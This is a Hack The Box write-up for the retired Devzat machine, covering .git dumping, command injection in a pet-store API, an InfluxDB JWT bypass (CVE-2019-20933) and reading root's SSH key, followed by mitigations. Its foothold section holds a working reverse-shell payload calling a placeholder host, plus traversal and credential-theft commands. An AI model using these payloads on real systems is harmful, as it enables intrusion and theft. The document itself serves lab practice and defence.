---
machine: Devzat
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, git, command-injection, influxdb, jwt, cve-2019-20933, ssh]
---

# Devzat — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The box revolves around Devzat, a chat served over SSH on port `8000`. The main site advertises the application and the `pets.devzat.htb` vhost exposes the `.git` repository. Rebuilding the code reveals a directory traversal and a command injection in the `species` parameter (`cat characteristics/<species>`), yielding a shell as `partick`. From localhost, `catherine`'s chat is reachable, and its history mentions an InfluxDB instance. CVE-2019-20933 allows forging a JWT with an empty secret, reading the database and recovering her password. `catherine` can read the source of a new Devzat version, whose added command is vulnerable to file read and yields root's private key over SSH.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,8000 <IP>
```

- `22` OpenSSH 8.2p1 Ubuntu.
- `80` Apache httpd 2.4.41.
- `8000` speaks SSH: it is the Devzat chat, not a web service.

```bash
ffuf -u http://devzat.htb -H "Host: FUZZ.devzat.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>
```

The `pets.devzat.htb` vhost shows up during fuzzing and is added to `/etc/hosts`.

## Enumeration

`devzat.htb` explains how to connect to the chat and shows a sample user. `pets.devzat.htb` is a pet store whose form sends the species to the API.

The `.git` directory is reachable at the vhost root:

```bash
git-dumper http://pets.devzat.htb/.git/ pets
cd pets && git log --oneline
```

The rebuilt code shows the request handler and the vulnerable line:

```go
cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
```

The same parameter is used earlier to build a path, allowing a read traversal:

```text
GET /?species=../../../../../../../etc/passwd
```

## Foothold

The injection is exploited by appending a command separator to `species`:

```bash
curl -s "http://pets.devzat.htb/?species=dog;id"
curl -s "http://pets.devzat.htb/?species=dog;bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'"
```

Execution is as `partick`. The shell is stabilized and the Devzat chat is confirmed to listen on `8000` on localhost.

## Lateral movement

The chat rejects some usernames from outside but allows a connection as `partick`:

```bash
ssh -p 8000 partick@devzat.htb
```

In the conversation history, `catherine` mentions an InfluxDB instance. A `netstat -tlnp` confirms port `8086` on localhost. The version is vulnerable to CVE-2019-20933: InfluxDB accepts a JWT signed with an empty shared secret.

A token is generated for `catherine` and the API queried:

```bash
curl -s "http://127.0.0.1:8086/query?db=devzat&q=SHOW+USERS" -H "Authorization: Bearer <JWT>"
curl -s "http://127.0.0.1:8086/query?db=devzat&q=SELECT+*+FROM+users" -H "Authorization: Bearer <JWT>"
```

The response includes `catherine`'s password, used with `su`.

## Privilege escalation

`catherine`'s home holds a copy of the source and binary of a new Devzat version. Analysis shows an added command that reads a user-supplied file. Pointing it at root's private key:

```text
<COMMAND> /root/.ssh/id_rsa
```

yields the key, which is saved with `600` permissions and used to log in as root:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@devzat.htb
```

## Evidence

- `.git` dumped and code containing `exec.Command("sh", "-c", ...)`.
- `/etc/passwd` read through traversal.
- `id` execution and reverse shell as `partick`.
- Chat history and port `8086` on localhost.
- Empty-secret JWT and `catherine`'s password from InfluxDB.
- Root's private key read by the vulnerable command.

## Lessons learned

- An exposed `.git` hands over the code and, with it, the exact vulnerabilities.
- Concatenating input into a command line is execution, even in a Go binary.
- Internal services (databases, panels) are only unreachable until a local shell exists.
- An outdated dependency with an auth bypass turns an internal database into a credential dump.
- Code from an unreleased version may add features more dangerous than the published one.

## Mitigations and detection

- Never publish `.git`, backups or source code under the document root.
- Validate the parameter against a species allowlist and use `exec.Command` without `sh -c`.
- Update InfluxDB to a fixed release and require a non-empty JWT secret.
- Restrict InfluxDB access to localhost with authentication and TLS.
- Review new chat commands before deployment and restrict which paths can be read.
- Alert on requests containing `;`, `|` or `$()` in parameters and on SSH key reads.

## References

- [0xdf — Devzat](https://0xdf.gitlab.io/2022/03/12/htb-devzat.html)
- [IppSec — Devzat](https://www.youtube.com/watch?v=QEgtbzS1Pyc)
- [Hack The Box — Devzat](https://app.hackthebox.com/machines/devzat)
- [NVD — CVE-2019-20933](https://nvd.nist.gov/vuln/detail/CVE-2019-20933)
